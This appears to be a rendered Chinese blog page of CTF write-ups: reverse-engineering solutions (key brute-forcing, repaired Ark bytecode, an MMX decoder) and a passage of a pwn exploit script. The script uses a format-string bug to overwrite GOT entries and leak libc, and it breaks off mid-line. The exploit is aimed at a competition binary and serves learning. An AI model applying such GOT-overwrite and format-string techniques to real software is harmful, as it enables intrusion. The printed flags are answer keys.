class="keyword">return</span> TRUE;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ConsoleHandler</span><span class="params">(DWORD dwCtrlType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(dwCtrlType == CTRL_C_EVENT) &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\r&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, Key[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT1[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT2[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT3[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(dwCtrlType == CTRL_BREAK_EVENT)</span><br><span class="line">        <span class="built_in">ShowExecutionTime</span>(TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowExecutionTime</span><span class="params">(BOOL bBreaked)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;lt1);</span><br><span class="line">    dw1 = <span class="built_in">GetTickCount</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(bBreaked) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nCurrent Keys:\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, Key[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT1[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT2[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT3[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(szFmtDate,<span class="string">&quot;Start:&quot;</span>, lt<span class="number">0.</span>wYear, lt<span class="number">0.</span>wMonth, lt<span class="number">0.</span>wDay, lt<span class="number">0.</span>wHour, lt<span class="number">0.</span>wMinute, lt<span class="number">0.</span>wSecond, lt<span class="number">0.</span>wMilliseconds);</span><br><span class="line">    <span class="built_in">printf</span>(szFmtDate,<span class="string">&quot;End:&quot;</span>, lt<span class="number">1.</span>wYear, lt<span class="number">1.</span>wMonth, lt<span class="number">1.</span>wDay, lt<span class="number">1.</span>wHour, lt<span class="number">1.</span>wMinute, lt<span class="number">1.</span>wSecond, lt<span class="number">1.</span>wMilliseconds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nExecution time:\t%d.%d seconds.\n&quot;</span>, (dw1 - dw0)/<span class="number">1000</span>, (dw1 - dw0)%<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowMatchedKeystream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *pKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\tFound:\t&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;KeyLength;j++)</span><br><span class="line">        <span class="built_in">printf</span>(szFmtHex2, pKey[j]);</span><br><span class="line"></span><br><span class="line">    dw1 = <span class="built_in">GetTickCount</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t%d.%d sec.\n&quot;</span>, (dw1 - dw0)/<span class="number">1000</span>, (dw1 - dw0)%<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<style>.fojfmsevcgnl{zoom:67%;}</style><img src="/2025/11/18/n1ctfjunior-re/1763435137193-3.png" class="fojfmsevcgnl" alt="img">

<p>而后用得到的密钥<code>B7 BC 71 42</code>对密文进行解密，可以发现能够得到正确的pe格式</p>
<p>里面是一个白盒aes加密算法</p>
<p>解白盒aes方法：<a target="_blank" rel="noopener" href="https://www.zskkk.cn/posts/15785/">https://www.zskkk.cn/posts/15785/</a></p>
<style>.vhrbvasxtgdy{zoom:67%;}</style><img src="/2025/11/18/n1ctfjunior-re/1763435137193-4.png" class="vhrbvasxtgdy" alt="img">

<style>.btifmovtzejk{zoom:67%;}</style><img src="/2025/11/18/n1ctfjunior-re/1763435137193-5.png" class="btifmovtzejk" alt="img">

<p>key&#x3D; 009CF29131C8E4EA81BD5DD248E6F3E0</p>
<p>密文：61E2312BDB5D41BF03F604A7F478680E41AB532035C2B87894E140F40A9F0F0795C6208C653C8C2732B026A83614F04F6D44CB66BB784726881EABC3FDF283CB</p>
<p>flag{7h3_Pyr4m1d_0f_Py7h0n_4w4175_175_M4573r_R3v3r53r_uJ6gG3qVs}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/11/18/n1ctfjunior-re/" data-id="cuidIOkdc9Fy33C5lR_iInfFH" data-title="n1ctfjunior-re" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-qwb2025-re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/11/01/qwb2025-re/" class="article-date">
  <time class="dt-published" datetime="2025-11-01T02:15:47.000Z" itemprop="datePublished">2025-11-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/11/01/qwb2025-re/">qwb2025-re</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="trade"><a href="#trade" class="headerlink" title="trade"></a>trade</h2><p>docker desktop代理设置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;builder&quot;: &#123;</span><br><span class="line">    &quot;gc&quot;: &#123;</span><br><span class="line">      &quot;defaultKeepStorage&quot;: &quot;20GB&quot;,</span><br><span class="line">      &quot;enabled&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;experimental&quot;: false,</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.1ms.run&quot;,</span><br><span class="line">    &quot;https://docker.1panel.live/&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>动态调试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./tragre</span><br><span class="line">pgrep -fl tradre </span><br><span class="line">gdbserver :1234 --attach 8900 </span><br></pre></td></tr></table></figure>



<h2 id="ABabyChal"><a href="#ABabyChal" class="headerlink" title="ABabyChal"></a>ABabyChal</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ark_js_vm chal.abc</span><br></pre></td></tr></table></figure>

<p>指的是运行 <strong>Ark 引擎 (Ark JavaScript VM)</strong> 来执行一个 <strong>编译好的字节码文件 <code>chal.abc</code></strong>。</p>
<p><code>.abc</code> 文件是 <strong>Ark ByteCode</strong>（方舟字节码）文件。<br> 这是鸿蒙系统中由 <code>arkcompile</code> 或 <code>es2abc</code> 工具生成的中间格式。</p>
<p>Disassembler是ArkTS反汇编工具。如果需要分析方舟字节码文件（*.abc）相关问题，开发者可以使用Disassembler将方舟字节码文件反编译为可读的汇编指令。</p>
<p>工具随DevEco Studio SDK发布。以Windows平台为例，Disassembler工具位于DevEco Studio&#x2F;sdk&#x2F;default&#x2F;openharmony&#x2F;toolchains&#x2F;ark_disasm.exe。</p>
<p>报错了，换一个工具：jadx-dev-all.jar，读取abc文件的jdax工具。</p>
<p>方舟字节码文件格式：</p>
<p>字节码文件起始于<a target="_blank" rel="noopener" href="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/arkts-bytecode-file-format-V5#header">Header</a>结构。文件中的所有结构均可以从Header出发，直接或间接地访问到。字节码文件中所有的多字节值均采用小端字节序。</p>
<p>Header：</p>
<table>
<thead>
<tr>
<th align="left"><strong>名称</strong></th>
<th align="left"><strong>格式</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">magic</td>
<td align="left">uint8_t[8]</td>
<td align="left">文件头魔数，值必须是’P’ ‘A’ ‘N’ ‘D’ ‘A’ ‘\0’ ‘\0’ ‘\0’。</td>
</tr>
<tr>
<td align="left">checksum</td>
<td align="left">uint32_t</td>
<td align="left">字节码文件除文件头魔数和本校验字段之外的内容的adler32校验和。</td>
</tr>
<tr>
<td align="left">version</td>
<td align="left">uint8_t[4]</td>
<td align="left">字节码文件的版本号 (<a target="_blank" rel="noopener" href="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/arkts-bytecode-file-format-V5#version">Version</a>) 。</td>
</tr>
</tbody></table>
<p>执行abc文件：</p>
<style>.rffpqlpmdret{zoom: 80%;}</style><img src="/2025/11/01/qwb2025-re/image-20251019011550085.png" class="rffpqlpmdret" alt="image-20251019011550085">

<p><code>v80</code> 是一个 <code>std::vector&lt;std::string&gt;</code> 的底层数组，存储分割后的 ABC 文件路径（或者入口函数信息）。</p>
<p>循环调用：panda::JSNApi::Execute(EcmaVM, path, &amp;entry, 0, &amp;set)</p>
<p><strong>参数解释：</strong></p>
<ul>
<li><code>EcmaVM</code>：VM 实例</li>
<li><code>path</code>：ABC 文件路径</li>
<li><code>entry</code>：入口函数名（可以是默认 <code>main</code> 或者用户指定）</li>
<li><code>0</code>：执行选项</li>
<li><code>&amp;set</code>：可能是执行上下文或返回值存储</li>
</ul>
<p><strong>作用：</strong> 把 <code>.abc</code> 文件加载到 VM 并执行。</p>
<p>用jadx-dev-all.jar打开.abc文件有大量报错，猜测修改了字节码。搜索找到一份字节码表： <a target="_blank" rel="noopener" href="https://www.seaxiang.com/blog/JdVvVU#menu_7">harmony 鸿蒙Ark Bytecode Fundamentals</a></p>
<p>或者搜索⼀圈后找到函数 panda::ecmascript::RuntimeStubs::DebugPrintInstruction </p>
<p>尝试在libark_jsruntime.so中搜索一个字节码名称，还真能找到：  </p>
<style>.llpbsfgwkqtm{zoom:80%;}</style><img src="/2025/11/01/qwb2025-re/image-20251020140119923.png" class="llpbsfgwkqtm" alt="image-20251020140119923">

<p>根据这个字节码找到修改后的字节码表函数sub_1F73E90:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_1F73E90(__int64 a1, unsigned __int8 **a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  char *v4; // rsi</span><br><span class="line">  const char *v5; // rsi</span><br><span class="line">  const char *v6; // rsi</span><br><span class="line">  const char *v7; // rsi</span><br><span class="line">  const char *v8; // rsi</span><br><span class="line">  const char *v9; // rsi</span><br></pre></td></tr></table></figure>

<p>根据这个函数修复.abc文件中的字节码，得到的out.abc可以使用刚才的工具反编译。</p>
<p><code>validateChallenge</code> 的处理管线（正向）大致是：</p>
<ol>
<li>把用户输入当作 Base64 解码（<code>definefunc2</code>）。</li>
<li>用一个替换表对字符做简单替换（createobjectwithbuffer）。</li>
<li>对字母&#x2F;数字做逐位可变的 Caesar 位移（每位不同的偏移 <code>(i*17+23)%26</code>）。</li>
<li>对每字节做按位循环左移（移位量依赖于状态机 i7&#x2F;i8）。</li>
<li>将结果每 6 字节一组反转（reverse 每 6 字符块）。</li>
<li>把字符串用 3 个不同的字节数组作为循环 key 做三轮 <code>xor</code>（每轮：<code>(byte ^ key[(i*11)%len(key)]) ^ ((i*3)&amp;255)</code>）。</li>
<li>再按一个固定的索引置换（permutation array）抽取出最终的字节序列 <code>r42</code>，并对其做 Base64 编码后与常量字符串比较。</li>
</ol>
<p>得到的结果大部分正确，最后两字节有问题，根据题目提示md5爆⼀下即可。  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = b&#x27;flag&#123;4f9cc0d2b33f5d7e2b0955765bb33f0&#x27;</span><br><span class="line">from hashlib import md5</span><br><span class="line">for i in &#x27;0123456789abcdef&#x27;:</span><br><span class="line">	if md5(s + i.encode() + b&#x27;&#125;&#x27;).hexdigest() ==</span><br><span class="line">&#x27;7a2028696ca643a57ddeda6642f781ae&#x27;:</span><br><span class="line">	print(s + i.encode() + b&#x27;&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"># flag&#123;4f9cc0d2b33f5d7e2b0955765bb33f0a&#125;</span><br></pre></td></tr></table></figure>

<h2 id="butterfly"><a href="#butterfly" class="headerlink" title="butterfly"></a>butterfly</h2><p>核心编码逻辑在MMX部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v29 = _m_pxor(v28-&gt;m64_u64, v42[0]);        // XOR</span><br><span class="line">v30 = _m_por(_m_psrlwi(v29, 8u), _m_psllwi(v29, 8u));  // 字节交换</span><br><span class="line">v28-&gt;m64_u64 = _m_paddb(_m_por(_m_psllqi(v30, 1u), _m_psrlqi(v30, 0x3Fu)), v42[0]);  // 循环移位+加法</span><br></pre></td></tr></table></figure>

<p>逆这个过程</p>
<p>密钥信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v24 = _mm_loadu_si128((const __m128i *)&quot;MMXEncode2024&quot;);</span><br></pre></td></tr></table></figure>

<p>程序会生成：</p>
<ul>
<li>编码后的数据文件</li>
<li>对应的<code>.key</code>密钥文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">encoded.dat:8F A3 9C B7 70 8D 8F 98 9D BF 8C 99 8C 73 E5 90</span><br><span class="line">8D 8D 8C 85 88 79 85 7C 9D 9F 3C 53 16 15 19 12</span><br><span class="line">36 37 7D 0A</span><br><span class="line">encoded.dat.key:4D 4D 58 45 6E 63 6F 64 65 32 30 32 34 00 45 6E</span><br><span class="line">63 6F 64 69 6E 67 20 66 69 6C 65 3A 20 25 73 0A</span><br></pre></td></tr></table></figure>

<p><strong>encoded.dat.key</strong>:<br>前13字节是密钥：<code>4D 4D 58 45 6E 63 6F 64 65 32 30 32 34</code> &#x3D; <code>&quot;MMXEncode2024&quot;</code></p>
<p>从代码看，编码步骤是：</p>
<ol>
<li><code>_m_pxor</code> - XOR操作</li>
<li><code>_m_por(_m_psrlwi(v29, 8u), _m_psllwi(v29, 8u))</code> - 字节交换</li>
<li><code>_m_por(_m_psllqi(v30, 1u), _m_psrlqi(v30, 0x3Fu))</code> - 循环左移1位</li>
<li><code>_m_paddb</code> - 字节加法</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">def mmx_decode_precise(encoded_data, key):</span><br><span class="line">    key_bytes = key.ljust(8, b&#x27;\x00&#x27;)[:8]  # 取前8字节作为XOR密钥</span><br><span class="line">    key_qword = int.from_bytes(key_bytes, &#x27;little&#x27;)</span><br><span class="line">    </span><br><span class="line">    decoded = bytearray()</span><br><span class="line">    </span><br><span class="line">    for i in range(0, len(encoded_data), 8):</span><br><span class="line">        chunk = encoded_data[i:i+8]</span><br><span class="line">        if len(chunk) &lt; 8:</span><br><span class="line">            chunk = chunk + b&#x27;\x00&#x27; * (8 - len(chunk))</span><br><span class="line">        </span><br><span class="line">        encrypted = int.from_bytes(chunk, &#x27;little&#x27;)</span><br><span class="line">        </span><br><span class="line">        # 逆向 _m_paddb</span><br><span class="line">        temp1 = encrypted</span><br><span class="line">        temp1_bytes = bytearray()</span><br><span class="line">        for j in range(8):</span><br><span class="line">            byte_val = (temp1 &gt;&gt; (j * 8)) &amp; 0xFF</span><br><span class="line">            # 减去key的对应字节</span><br><span class="line">            key_byte = (key_qword &gt;&gt; (j * 8)) &amp; 0xFF</span><br><span class="line">            temp1_bytes.append((byte_val - key_byte) &amp; 0xFF)</span><br><span class="line">        temp1 = int.from_bytes(temp1_bytes, &#x27;little&#x27;)</span><br><span class="line">        </span><br><span class="line">        # 逆向循环移位: 右移1位 (原先是左移1位)</span><br><span class="line">        temp2 = ((temp1 &gt;&gt; 1) | ((temp1 &amp; 1) &lt;&lt; 63)) &amp; 0xFFFFFFFFFFFFFFFF</span><br><span class="line">        </span><br><span class="line">        # 逆向字节交换 (16位字内交换字节)</span><br><span class="line">        temp3_bytes = bytearray()</span><br><span class="line">        temp2_bytes = temp2.to_bytes(8, &#x27;little&#x27;)</span><br><span class="line">        for j in range(0, 8, 2):</span><br><span class="line">            if j + 1 &lt; 8:</span><br><span class="line">                temp3_bytes.append(temp2_bytes[j + 1])</span><br><span class="line">                temp3_bytes.append(temp2_bytes[j])</span><br><span class="line">            else:</span><br><span class="line">                temp3_bytes.append(temp2_bytes[j])</span><br><span class="line">        temp3 = int.from_bytes(temp3_bytes, &#x27;little&#x27;)</span><br><span class="line">        </span><br><span class="line">        # XOR解密</span><br><span class="line">        decrypted = temp3 ^ key_qword</span><br><span class="line">        </span><br><span class="line">        decrypted_bytes = decrypted.to_bytes(8, &#x27;little&#x27;)</span><br><span class="line">        decoded.extend(decrypted_bytes[:min(8, len(encoded_data)-i)])</span><br><span class="line">    </span><br><span class="line">    return bytes(decoded)</span><br><span class="line"></span><br><span class="line"># 编码的数据</span><br><span class="line">encoded_hex = &quot;8F A3 9C B7 70 8D 8F 98 9D BF 8C 99 8C 73 E5 90 8D 8D 8C 85 88 79 85 7C 9D 9F 3C 53 16 15 19 12 36 37 7D 0A&quot;</span><br><span class="line">encoded_bytes = bytes.fromhex(encoded_hex.replace(&quot; &quot;, &quot;&quot;))</span><br><span class="line"></span><br><span class="line"># 密钥</span><br><span class="line">key = b&quot;MMXEncode2024&quot;</span><br><span class="line"></span><br><span class="line">print(f&quot;编码数据长度: &#123;len(encoded_bytes)&#125; 字节&quot;)</span><br><span class="line">print(f&quot;密钥: &#123;key&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 解码</span><br><span class="line">decoded_result = mmx_decode_precise(encoded_bytes, key)</span><br><span class="line">print(&quot;\n解码结果 (十六进制):&quot;, decoded_result.hex())</span><br><span class="line">print(&quot;解码结果 (原始字节):&quot;, decoded_result)</span><br><span class="line">print(&quot;\n可读文本:&quot;, decoded_result.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))</span><br><span class="line"></span><br><span class="line"># 尝试不同的编码</span><br><span class="line">try:</span><br><span class="line">    print(&quot;作为ASCII:&quot;, decoded_result.decode(&#x27;ascii&#x27;, errors=&#x27;ignore&#x27;))</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"># 显示每个字节的值</span><br><span class="line">print(&quot;\n字节分析:&quot;)</span><br><span class="line">for i, byte in enumerate(decoded_result):</span><br><span class="line">    print(f&quot;字节[&#123;i:2d&#125;]: 0x&#123;byte:02X&#125; = &#123;byte:3d&#125; = &#x27;&#123;chr(byte) if 32 &lt;= byte &lt; 127 else &#x27;?&#x27;&#125;&#x27;&quot;)</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/11/01/qwb2025-re/" data-id="cuid0P0QLBFLn499T3dQ--ylw" data-title="qwb2025-re" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-qwb2025-pwn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/25/qwb2025-pwn/" class="article-date">
  <time class="dt-published" datetime="2025-10-25T12:37:58.000Z" itemprop="datePublished">2025-10-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>解体思路写代码里面了<br>由于scanf向data段的全局变量里读，因此可以覆盖同样存在于data段中的printf的参数的字符串，构造格式化字符串漏洞，注意这里的格式化字符串漏洞写入内容不在栈上，但是read函数可以读0x10字节在栈上<br>（覆盖memset地址时只用覆盖低6位即可）<br>（建议自己调试时候把putchr下面的sleep逻辑patch掉，节省时间）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 第一次泄露libc地址，并且将fclose got重定向到main的起始地址  </span></span><br><span class="line">    fclose_got = elf.got[<span class="string">&#x27;fclose&#x27;</span>]</span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line">    fclose_got = elf.got[<span class="string">&#x27;fclose&#x27;</span>]</span><br><span class="line">    main_addr = <span class="number">0x40139B</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> </span><br><span class="line">    fmtstr = <span class="string">f&#x27;%<span class="subst">&#123;main_addr &#125;</span>c%12$hn&#x27;</span>.encode()+ <span class="string">b&#x27;---%25$p----&#x27;</span></span><br><span class="line">    payload += fmtstr</span><br><span class="line">    sla(<span class="string">b&#x27;opened user.log, please report:\n&#x27;</span>,payload)</span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,p64(fclose_got))</span><br><span class="line">    ru(<span class="string">b&#x27;---&#x27;</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(ru(<span class="string">b&#x27;----&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x2a1ca</span></span><br><span class="line">    leak(<span class="string">&#x27;libc.address&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 取消exit,并且使其执行时跳转到fget获取flag</span></span><br><span class="line">    <span class="comment"># 401660</span></span><br><span class="line">    fgets_flag_instr =<span class="number">0x4014F9</span></span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> </span><br><span class="line">    fmtstr = <span class="string">f&#x27;%<span class="subst">&#123;fgets_flag_instr &#125;</span>c%12$hn&#x27;</span>.encode()</span><br><span class="line">    payload += fmtstr</span><br><span class="line">    </span><br><span class="line">    sla(<span class="string">b&#x27;opened user.log, please report:\n&#x27;</span>,payload)</span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    exit_got = elf.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,p64(exit_got))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将 memset 改为 puts</span></span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line">    puts_addr = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    payload = <span 